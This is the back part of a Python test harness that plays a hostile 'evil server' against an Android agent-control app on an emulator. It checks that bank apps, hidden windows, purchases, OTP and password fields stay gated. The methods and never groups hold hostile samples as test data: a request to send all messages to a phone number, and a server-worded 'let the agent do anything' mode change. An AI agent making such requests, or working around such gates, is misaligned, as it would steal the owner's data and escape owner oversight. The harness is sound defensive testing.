              res.get("ok") is True and (got.get("package") == "com.example.bank" or "com.example.bank" in (got.get("candidates") or []))
              and "com.example.bank" not in f, short(res) + f" focus={f}")
        dev.logcat_clear()
        r = await phone.call("open_url", url="https://bank.example.com/account")
        await asyncio.sleep(2)
        f = dev.focus()
        check(G, "an https link whose handler is the bank app is refused (gate_blocked_app), bank not opened",
              refused(r, "gate_blocked_app") and "com.example.bank" not in f, rule(r) + f" focus={f}")
    finally:
        dev.sh("pm set-app-links-user-selection --user 0 --package com.example.bank false bank.example.com")
        dev.sh("pm set-app-links --package com.example.bank 0 bank.example.com")
    dev.home()
    r = await phone.call("open_url", url="https://example.com/")
    await asyncio.sleep(3)
    f = dev.focus()
    check(G, "an ordinary https link opens in the browser (control)", r.get("ok") is True and "chrome" in f, short(r)[:80] + f" focus={f}")
    dev.sh("input keyevent BACK")
    dev.home()


async def g_hidden(phone: Phone, dev: Device) -> None:
    """A window hidden from accessibility services (the login stand-in's HiddenActivity, accessibilityDataSensitive):
    reads stay black, every act is refused (`builtin:unknown_window`), BACK is judged like any key."""
    G = "hidden"
    if not dev.installed("com.example.login"):
        check(G, "stand-in login app installed", False, "skipped")
        return
    dev.unlock()
    dev.home()
    dev.sh("am force-stop com.example.login")
    dev.sh("am start -n com.example.login/.HiddenActivity")
    await asyncio.sleep(3.5)  # the phone OCRs an unreadable window before judging; give it the time
    dev.shot("hidden-emulator-screen")
    f = dev.focus()
    if "HiddenActivity" not in f:
        check(G, "hidden stand-in screen in front", False, f)
        return
    shot = await phone.call("screenshot")
    data = shot.get("binary", b"")
    if not data and isinstance(shot.get("result"), dict) and shot["result"].get("jpeg"):
        import base64
        data = base64.b64decode(shot["result"]["jpeg"])
    if data:
        with open(os.path.join(dev.out, "hidden-server-screenshot.jpg"), "wb") as fh:
            fh.write(data)
    mean = jpeg_mean(data)
    check(G, "a screenshot of a window hidden from accessibility is black", shot.get("ok") is True and 0 <= mean < 3,
          f"mean luminance {mean:.2f}, {len(data)} bytes")
    els = await phone.call("ui_elements")
    check(G, "the hidden window reads as []", els.get("ok") and els.get("result") == [], short(els)[:160])
    w = await phone.call("wait_for", condition={"until": "text_appears", "pattern": "Confirm"}, timeout_ms=1500)
    got = w.get("result") or {}
    check(G, "wait_for over the hidden window is redacted", w.get("ok") and got.get("met") is False and got.get("redacted") is True, short(w))
    r = await phone.call("stream_start", max_side=720, bitrate=1_000_000, fps=15)
    check(G, "stream_start over the hidden window is refused", refused(r, "gate_blocked_app"), rule(r))
    if r.get("ok"):
        await phone.call("stream_stop")
    dev.logcat_clear()
    codes = []
    for x, y in ((540, 680), (540, 900), (540, 1300)):
        r = await phone.call("tap", x=x, y=y)
        codes.append(rule(r))
    r = await phone.call("swipe", x1=540, y1=1500, x2=540, y2=800, duration_ms=300)
    codes.append("swipe " + rule(r))
    r = await phone.call("long_press", x=540, y=680, duration_ms=600)
    codes.append("long_press " + rule(r))
    r = await phone.call("type_text", text="1")
    # Typing: the service sees no focused field in a hidden window, so the phone errors ("No focused text field")
    # rather than the gate refusing; nothing can be typed either way.
    codes.append("type " + rule(r) + ("" if r.get("ok") is not False else f" ({str(r.get('error'))[:40]})"))
    typed_stopped = r.get("ok") is False
    await asyncio.sleep(0.5)
    log = dev.log("LoginStandIn")
    check(G, "taps, swipes, long presses and typing on the hidden window are refused and never land",
          all(c.split(" ")[-1].startswith(("gate_screen_unstable", "gate_denied_page", "needs_owner_dialog")) for c in codes[:-1])
          and typed_stopped and "HIDDEN" not in log, f"{codes} landed={'HIDDEN' in log}")
    check(G, "the refusal names the unknown window", any("unknown_window" in c or "no_window" in c for c in codes), str(codes))
    r = await phone.call("key", name="BACK")
    await asyncio.sleep(1.5)
    f2 = dev.focus()
    check(G, "BACK is judged like any key: allowed, and it leaves the hidden screen", r.get("ok") is True and "HiddenActivity" not in f2,
          short(r) + f" focus={f2}")
    dev.home()


async def g_methods(phone: Phone, dev: Device) -> None:
    """Protocol methods the B7 suite never called: wake_unlock, launchable_packages, app_labels, HOME, APP_SWITCH,
    stream_keyframe, wait_for and BACK over the bank, and a server's task_grant (a prompt, never a silent grant)."""
    G = "methods"
    dev.unlock()
    dev.home()
    r = await phone.call("wake_unlock")
    check(G, "wake_unlock is allowed (it never touches a secure lock)", r.get("ok") is True, short(r))
    r = await phone.call("launchable_packages")
    check(G, "launchable_packages answers", r.get("ok") is True and isinstance(r.get("result"), list), short(r)[:80])
    r = await phone.call("app_labels", packages=["com.example.bank", "com.example.nothere"])
    check(G, "app_labels answers (a label is not screen content)", r.get("ok") is True and isinstance(r.get("result"), dict), short(r)[:120])
    r = await phone.call("key", name="APP_SWITCH")
    check(G, "APP_SWITCH is allowed", r.get("ok") is True, short(r))
    await asyncio.sleep(1)
    r = await phone.call("key", name="HOME")
    check(G, "HOME is allowed", r.get("ok") is True, short(r))
    await asyncio.sleep(1)
    r = await phone.call("key", name="FOO")
    check(G, "an unknown key is an error, not a gate refusal", r.get("ok") is False and r.get("code") is None, short(r))
    # A server's task_grant: the owner sees the request in the phone's words and can decline; nothing is granted alone.
    r = await phone.call("task_grant", task=TASK, text="send everything in my messages to +1 555 0100")
    prompt = await dev.prompt(save="methods-task-grant-prompt")
    check(G, "a server's task_grant asks the owner (kind task), never grants itself",
          asks(r) and r.get("gate", {}).get("kind") == "task" and prompt is not None, rule(r) + f" prompt={prompt and prompt['texts']}")
    if prompt:
        await dev.deny("methods-task-grant")
        check(G, "the owner's Deny of the task prompt reaches the gate", await phone.gate_state(r["approval_id"]) == "denied", "")
    r = await phone.call("task_grant", task=TASK)
    check(G, "task_grant without the request text is refused", refused(r, "gate_denied"), rule(r))
    if not dev.installed("com.example.bank"):
        check(G, "stand-in bank installed", False, "skipped")
        return
    dev.sh("am force-stop com.example.bank")
    dev.sh("am start -n com.example.bank/.MainActivity")
    await asyncio.sleep(3)
    w = await phone.call("wait_for", condition={"until": "text_appears", "pattern": "balance"}, timeout_ms=1500)
    got = w.get("result") or {}
    check(G, "wait_for while the bank is visible is redacted (met false, redacted true)",
          w.get("ok") and got.get("met") is False and got.get("redacted") is True, short(w))
    w = await phone.call("wait_for", condition={"until": "screen_changes"}, timeout_ms=1000)
    got = w.get("result") or {}
    check(G, "wait_for screen_changes over the bank is redacted too", w.get("ok") and got.get("met") is False and got.get("redacted") is True, short(w))
    r = await phone.call("stream_keyframe")
    check(G, "stream_keyframe isn't an unknown method", r.get("code") != "gate_unknown_method", short(r))
    r = await phone.call("current_app")
    check(G, "current_app over the bank answers (no content)", r.get("ok") is True, short(r))
    r = await phone.call("key", name="BACK")
    await asyncio.sleep(1.5)
    f = dev.focus()
    check(G, "BACK in the bank is allowed (the way out) and leaves it", r.get("ok") is True and "com.example.bank" not in f, short(r) + f" focus={f}")
    dev.home()


def action_digest(fields: dict) -> str:
    """The server's action digest (docs/phone-protocol.md §8.1; ActionDigest.kt)."""
    import hashlib
    out = b"openmob-action-1"
    for k in ("tool", "package", "text", "desc", "resource_id", "bounds", "input"):
        raw = str(fields.get(k) or "").encode()
        out += f"|{len(raw)}:".encode() + raw
    return hashlib.sha256(out).hexdigest()


async def open_review(dev: Device, name: str) -> bool:
    """The owner opens a server approval_request from its notification ("Approve? …", in the phone's own words;
    tapping it, or its Review action, opens ApprovalActivity). The heads-up may already be on screen, else the shade
    is pulled down. (uiautomator: OpenMob's service is restored by the caller.)"""
    for attempt in range(4):
        nodes = dev.ua_nodes(name if attempt == 0 else None)
        hit = next((n["center"] for n in nodes if (n.get("text") or "").startswith("Approve?") or (n.get("text") or "") == "Review"), None)
        if hit:
            dev.sh(f"input tap {hit[0]} {hit[1]}")
            for _ in range(6):
                await asyncio.sleep(0.5)
                if "ApprovalActivity" in dev.focus():
                    break
            dev.sh("cmd statusbar collapse")
            if "ApprovalActivity" not in dev.focus() and "MainActivity" in dev.focus():
                # The notification opens the app's main screen, where the pending request sits at the top (its
                # buttons may start under the status bar): scroll up, then Review & approve.
                dev.sh("input swipe 540 800 540 2000 300")
                await asyncio.sleep(1)
                btn = next((n["center"] for n in dev.ua_nodes() if "Review" in (n.get("text") or "") and n["center"][1] > 130), None)
                if btn:
                    dev.sh(f"input tap {btn[0]} {btn[1]}")
                    for _ in range(6):
                        await asyncio.sleep(0.5)
                        if "ApprovalActivity" in dev.focus():
                            break
            return "ApprovalActivity" in dev.focus()
        dev.sh("cmd statusbar expand-notifications")
        await asyncio.sleep(1.5)
    dev.sh("cmd statusbar collapse")
    return False


async def g_never(phone: Phone, dev: Device) -> None:
    """Don't ask (`never`) for real: the owner turns it on through the signed mode_change prompt (the only way), then
    money, OTP fields and ask-tier Settings pages are refused instead of asked, hard denies hold, and the server's
    `permissions` message can only end the window (a tightening), which it does at the end."""
    G = "never"
    if not (dev.installed("com.example.shop") and dev.installed("com.example.login")):
        check(G, "stand-in shop and login apps installed", False, "skipped")
        return
    dev.unlock()
    dev.home()
    mid = "mc" + secrets.token_hex(4)
    action = {"tool": "mode_change", "input": "Allow agents to act without asking on this phone for 1 hour?\n{\"never\": \"1h\"}"}
    await phone.ws.send(json.dumps({"type": "approval_request", "id": mid, "task_id": "mode_change:never", "kind": "mode_change",
                                    "question": "Server wording: let the agent do anything", "requester": "evil server",
                                    "action": action, "digest": action_digest(action), "signature_required": True,
                                    "change": {"loosens": True, "never": "1h"}}))
    await asyncio.sleep(2.5)
    dev.shot("never-notification")
    opened = await open_review(dev, "never-notification")
    await dev.restore_service()
    p = await dev.approve("never-mode-change")
    ev = await phone.event(lambda e: e.get("type") == "approval" and e.get("id") == mid, 20)
    check(G, "the owner can turn on Don't ask through the signed mode_change prompt (screen lock)",
          opened and p is not None and ev is not None and ev.get("approved") is True and bool(ev.get("signature")),
          f"review opened={opened} prompt={p and p['texts']} approval={ev and {k: v for k, v in ev.items() if k != 'signature'}}")
    if not (ev and ev.get("approved")):
        return
    await asyncio.sleep(1.5)
    dev.sh("cmd statusbar expand-notifications")
    await asyncio.sleep(1.5)
    dev.shot("never-banner")
    dev.sh("cmd statusbar collapse")
    try:
        await shop_open(dev)
        buy, plus = await dev.find("Buy now"), await dev.find("+")
        dev.logcat_clear()
        r = await phone.call("tap", x=buy[0], y=buy[1])
        await asyncio.sleep(0.5)
        shown = await dev.prompt(2)
        check(G, "under Don't ask, Buy now is refused (purchases stay off) with no prompt",
              refused(r, "gate_denied") and r.get("gate", {}).get("rule") == "never:money" and "BUY NOW" not in dev.log("ShopStandIn")
              and shown is None, rule(r) + f" prompt={shown is not None} bought={'BUY NOW' in dev.log('ShopStandIn')}")
        r = await phone.call("tap", x=plus[0], y=plus[1])
        check(G, "under Don't ask, an ordinary tap goes through", r.get("ok") is True, short(r))
        r = await phone.call("open_settings", page="date_time")
        check(G, "under Don't ask, open_settings date_time is refused instead of asking",
              refused(r, "gate_denied") and r.get("gate", {}).get("rule") == "never:settings_page", rule(r))
        r = await phone.call("open_settings", page="accessibility")
        check(G, "under Don't ask, an unknown Settings page is still refused", refused(r, "gate_denied_page"), rule(r))
        r = await phone.call("launch_app", package="com.example.bank")
        check(G, "under Don't ask, the bank app is still blocked", refused(r, "gate_blocked_app"), rule(r))
        r = await phone.call("open_url", url="examplebank://transfer")
        check(G, "under Don't ask, a custom scheme is still refused", refused(r, "gate_denied"), rule(r))
        dev.sh("am force-stop com.example.login")
        dev.sh("am start -n com.example.login/.MainActivity")
        time.sleep(2)
        dev.logcat_clear()
        otp = await dev.find("Verification code", attr="hint") or await dev.find("Verification code")
        if otp:
            await phone.call("tap", x=otp[0], y=otp[1])
            await asyncio.sleep(0.8)
            r = await phone.call("type_text", text="123456")
            check(G, "under Don't ask, typing a code into an OTP field is refused", refused(r, "gate_denied") and
                  r.get("gate", {}).get("rule") == "never:otp_field" and "OTP length" not in dev.log("LoginStandIn"), rule(r))
        pw = await dev.find("Password", attr="hint") or await dev.find("Password")
        if pw:
            await phone.call("tap", x=pw[0], y=pw[1])
            await asyncio.sleep(0.8)
            r = await phone.call("type_text", text="hunter2")
            check(G, "under Don't ask, a password field is still refused", refused(r, "gate_password_field"), rule(r))
        r = await phone.call("open_settings", page="display")
        await asyncio.sleep(1.5)
        check(G, "under Don't ask, an everyday Settings page still opens", r.get("ok") is True, short(r))
        dev.home()
    finally:
        # The server can end the window (a tightening is taken from anywhere), never start one (basics).
        await phone.ws.send(json.dumps({"type": "permissions", "default_mode": "auto", "ceiling": "auto"}))
        await asyncio.sleep(2)
    await shop_open(dev)
    buy = await dev.find("Buy now")
    r = await phone.call("tap", x=buy[0], y=buy[1])
    prompt = await dev.prompt()
    check(G, "a server 'permissions: auto' message ends Don't ask (a tightening): Buy now asks again",
          asks(r) and prompt is not None, rule(r) + f" prompt={prompt is not None}")
    if prompt:
        await dev.approve("never-off-buy-now")  # approved, never re-sent
        await phone.gate_state(r["approval_id"])
    dev.home()


def overlay_windows(dev: Device) -> dict[str, list[int]]:
    """OpenMob's indicator windows on screen now (by their window titles), with their frames."""
    out = {}
    text = dev.sh("dumpsys window windows")
    for title in ("OpenMob indicator", "OpenMob Stop"):
        m = re.search(re.escape(title) + r"\}:.*? frame=\[(\d+),(\d+)\]\[(\d+),(\d+)\]", text, re.S)
        if title in text:
            out[title] = [int(v) for v in m.groups()] if m else []
    return out


def edge_colour(path: str) -> tuple[int, int, int] | None:
    """The average colour of a strip along the left edge, half-way down (where the border is)."""
    try:
        from PIL import Image
        im = Image.open(path).convert("RGB")
    except Exception:
        return None
    w, h = im.size
    px = [im.getpixel((x, y)) for x in range(0, 6) for y in range(h // 2 - 40, h // 2 + 40, 4)]
    return tuple(sum(c[i] for c in px) // len(px) for i in range(3))


def bluish(c) -> bool:
    return c is not None and c[2] > 150 and c[2] > c[0] + 60


def amberish(c) -> bool:
    return c is not None and c[0] > 180 and c[1] > 100 and c[2] < 90


async def g_indicator(phone: Phone, dev: Device) -> None:
    """The agent indicator (docs/design/control-indicator.md): a border and a Stop pill while an agent acts, amber while
    the phone's prompt waits, gone after the task; the gate looks through the border and refuses taps on the pill; the
    owner's tap on the pill stops everything. Runs last in a session (the pill's Stop disconnects)."""
    G = "indicator"
    if not dev.installed("com.example.shop"):
        check(G, "stand-in shop installed", False, "skipped")
        return
    await shop_open(dev)
    await asyncio.sleep(12)  # anything left over from an earlier group fades first
    before = overlay_windows(dev)
    shot0 = dev.shot("indicator-0-before")
    check(G, "no indicator before an agent acts", not before, f"{before} {shot0}")
    r = await phone.call("screenshot")
    check(G, "a read alone doesn't show it", not overlay_windows(dev), short(r)[:120])

    nodes = await dev.nodes()
    add = next((n for n in nodes if n["text"] == "Add to cart"), None)
    title = next((n for n in nodes if "USB-C cable" in n["text"]), None)
    if not add or not title:
        check(G, "the product page is readable", False, f"add={add} title={title}")
        return
    r = await phone.call("tap", x=title["center"][0], y=title["center"][1])
    shown = overlay_windows(dev)
    check(G, "an admitted tap shows the border and the pill before it returns",
          r.get("ok") is True and "OpenMob indicator" in shown and "OpenMob Stop" in shown, f"{short(r)[:120]} {shown}")
    await asyncio.sleep(0.5)
    shot1 = dev.shot("indicator-1-working")
    check(G, "the adb screenshot shows the blue border at the edge", bluish(edge_colour(shot1)), f"{edge_colour(shot1)} {shot1}")
    r = await phone.call("screenshot")
    agent_shot = os.path.join(dev.out, "indicator-2-agent-screenshot.jpg")
    jpeg = r.get("binary") or base64.b64decode((r.get("result") or {}).get("jpeg") or "")
    with open(agent_shot, "wb") as f:
        f.write(jpeg)
    check(G, "the agent's own screenshot works and includes the border (not black)",
          r.get("ok") is True and bool(jpeg) and bluish(edge_colour(agent_shot)), f"{edge_colour(agent_shot)} {agent_shot}")
    r = await phone.call("ui_elements")
    texts = [e.get("text", "") + e.get("desc", "") for e in r.get("result") or []]
    check(G, "ui_elements doesn't list the pill", not any("Stop" in t for t in texts), str(texts)[:200])

    # A tap at the very left edge, under the border, reaches the app (Add to cart logs).
    dev.logcat_clear()
    x = add["box"][0] + 4
    r = await phone.call("tap", x=x, y=add["center"][1])
    await asyncio.sleep(1)
    added = "ADDED" in dev.log("ShopStandIn")
    check(G, f"a tap near the edge (x={x}) passes through the border to the app", r.get("ok") is True and added,
          f"{short(r)[:120]} added={added}")

    pill = overlay_windows(dev).get("OpenMob Stop") or []
    if len(pill) != 4:
        check(G, "the pill's frame is known", False, str(pill))
        return
    home_pill = pill
    cx, cy = (pill[0] + pill[2]) // 2, (pill[1] + pill[3]) // 2

    # The pill dodges (owner decision 2026-10-17): a toolbar "Menu" button right under its default spot. The agent's
    # tap moves the pill to the top left first, then reaches the button; the owner's Stop never fires.
    dev.sh("am start -n com.example.shop/.ToolbarActivity")
    await asyncio.sleep(2.5)
    dev.logcat_clear()
    r = await phone.call("tap", x=cx, y=cy)
    await asyncio.sleep(1)
    moved = overlay_windows(dev).get("OpenMob Stop") or []
    menu = "MENU tapped" in dev.log("ShopStandIn")
    shot = dev.shot("indicator-1b-pill-dodged")
    check(G, "an agent tap on a button under the pill moves the pill to the top left and reaches the button",
          r.get("ok") is True and menu and len(moved) == 4 and moved[0] < 200 and moved[1] == pill[1],
          f"{short(r)[:120]} menu={menu} pill {pill} -> {moved} {shot}")
    # The agent aims at the pill's new spot: it moves again (back to the free top right); never stopped, never hidden.
    mx, my = ((moved[0] + moved[2]) // 2, (moved[1] + moved[3]) // 2) if len(moved) == 4 else (cx, cy)
    r = await phone.call("tap", x=mx, y=my)
    again = overlay_windows(dev).get("OpenMob Stop") or []
    # (The empty area there is judged as usual: the gate asks for an unlabeled tap over a screen whose only label is
    # "MENU". Either way it is judged on the app, not refused as the pill.)
    check(G, "an agent tap on the moved pill's spot moves it again and is judged on the app; the session stays up",
          (r.get("ok") is True or asks(r)) and again == home_pill and phone.ws.state == websockets.protocol.State.OPEN,
          f"{json.dumps(r.get('gate'))} pill {moved} -> {again}")
    check(G, "the pill and border are still showing", {"OpenMob Stop", "OpenMob indicator"} <= set(overlay_windows(dev)), "")
    if asks(r):
        await dev.deny("indicator-moved-pill-deny")
        await phone.gate_state(r["approval_id"])
        dev.sh("am start -n com.example.shop/.ToolbarActivity")
        await asyncio.sleep(2.5)
    # Once more onto the Menu: the pill ends this session in the top left (the next session starts in the owner's corner).
    r = await phone.call("tap", x=cx, y=cy)
    left = overlay_windows(dev).get("OpenMob Stop") or []
    check(G, "a repeat tap on the Menu moves the pill to the top left again", r.get("ok") is True and left[:1] == moved[:1],
          f"{short(r)[:120]} {left}")

    # The phone's own prompt: amber and thicker.
    await shop_open(dev)
    buy = await dev.wait_find("Buy now")
    r = await phone.call("tap", x=buy[0], y=buy[1]) if buy else {}
    if asks(r):
        await asyncio.sleep(1.5)
        shot3 = dev.shot("indicator-3-approval")
        check(G, "the approval prompt turns the border amber", amberish(edge_colour(shot3)), f"{edge_colour(shot3)} {shot3}")
        await dev.deny("indicator-buy-deny")
        await phone.gate_state(r["approval_id"])
    else:
        check(G, "Buy now asks", False, short(r))

    # The task ends: the border fades within the short hold.
    r = await phone.call("tap", x=title["center"][0], y=title["center"][1])
    await phone.ws.send(json.dumps({"type": "event", "kind": "result", "message": "Done."}))
    await asyncio.sleep(3)
    after = overlay_windows(dev)
    shot4 = dev.shot("indicator-4-after")
    check(G, "after the task's result the indicator is gone", not after and not bluish(edge_colour(shot4)), f"{after} {shot4}")

    # The owner taps the pill: the task stops (the connection closes with 1000) and the indicator goes.
    r = await phone.call("tap", x=title["center"][0], y=title["center"][1])
    pill = overlay_windows(dev).get("OpenMob Stop") or []
    check(G, "the next task's pill is back in the owner's corner", pill == home_pill, f"{pill} vs {home_pill}")
    if len(pill) == 4:
        dev.sh(f"input tap {(pill[0] + pill[2]) // 2} {(pill[1] + pill[3]) // 2}")
        await asyncio.sleep(2)
        closed = phone.ws.state != websockets.protocol.State.OPEN
        code = getattr(phone.ws, "close_code", None)
        gone = overlay_windows(dev)
        shot5 = dev.shot("indicator-5-stopped")
        check(G, "the owner's tap on the pill stops: socket closed with 1000, indicator gone",
              closed and code == 1000 and not gone, f"closed={closed} code={code} left={gone} {shot5}")
    else:
        check(G, "the pill shows for the Stop test", False, str(pill))

GROUPS = {"basics": g_basics, "settings": g_settings, "bank": g_bank, "login": g_login, "permissions": g_permissions,
          "permissions_bg": g_permissions_bg, "shop": g_shop, "webview": g_webview, "flood": g_flood, "promptrate": g_promptrate, "keepawake": g_keepawake, "friction": g_friction,
          "deeplinks": g_deeplinks, "typing": g_typing, "links": g_links, "financial": g_financial, "hidden": g_hidden, "methods": g_methods, "never": g_never,
          "spoof": g_spoof, "calls": g_calls, "hittest": g_hittest, "indicator": g_indicator, "probe": g_probe}


async def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--serial", required=True, help="the emulator's adb serial, e.g. emulator-5554")
    parser.add_argument("--port", type=int, default=8911)
    parser.add_argument("--token", default="")
    parser.add_argument("--pin", default=None, help="the emulator's PIN: approve prompts automatically")
    parser.add_argument("--out", default="evil-server-evidence")
    parser.add_argument("--groups", default=",".join(g for g in GROUPS if g != "probe"))
    parser.add_argument("--restart", action="store_true", help="restart the app before each group")
    args = parser.parse_args()
    dev = Device(args.serial, args.out, args.pin)
    token = args.token or secrets.token_urlsafe(16)
    print(f"Connect the app to http://10.0.2.2:{args.port} with token {token}", flush=True)
    sockets: asyncio.Queue = asyncio.Queue()

    async def handler(ws):
        path = ws.request.path if hasattr(ws, "request") else ws.path
        if token not in path:
            await ws.close(4401, "bad token")
            return
        hello = json.loads(await ws.recv())
        await ws.send(json.dumps({"type": "welcome", "session": hello.get("device", {}).get("id", "x")}))
        closed = asyncio.get_running_loop().create_future()
        await sockets.put((ws, hello, closed))
        await closed

    async with websockets.serve(handler, "0.0.0.0", args.port, max_size=None):
        current = None
        for name in args.groups.split(","):
            if args.restart or current is None or current[0].state != websockets.protocol.State.OPEN:
                if current:
                    current[2].set_result(None)
                if args.restart:
                    dev.restart_app()
                while True:  # the newest connection
                    current = await asyncio.wait_for(sockets.get(), 120)
                    if sockets.empty():
                        break
                phone = dev.phone = Phone(current[0], current[1])
                await asyncio.sleep(1)
            print(f"--- {name}", flush=True)
            try:
                await GROUPS[name](phone, dev)
            except Exception as e:  # a crashed group is a failure, not the end of the run
                import traceback
                tb = traceback.extract_tb(e.__traceback__)[-1]
                check(name, "group ran to completion", False, f"{type(e).__name__}: {e} (line {tb.lineno}: {tb.line})")
        if current and not current[2].done():
            current[2].set_result(None)
    failed = [r for r in RESULTS if not r[2]]
    with open(os.path.join(args.out, "results.json"), "w") as f:
        json.dump([{"group": g, "check": n, "ok": ok, "evidence": e} for g, n, ok, e in RESULTS], f, indent=1)
    print(f"\n{len(RESULTS) - len(failed)} passed, {len(failed)} failed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    asyncio.run(main())
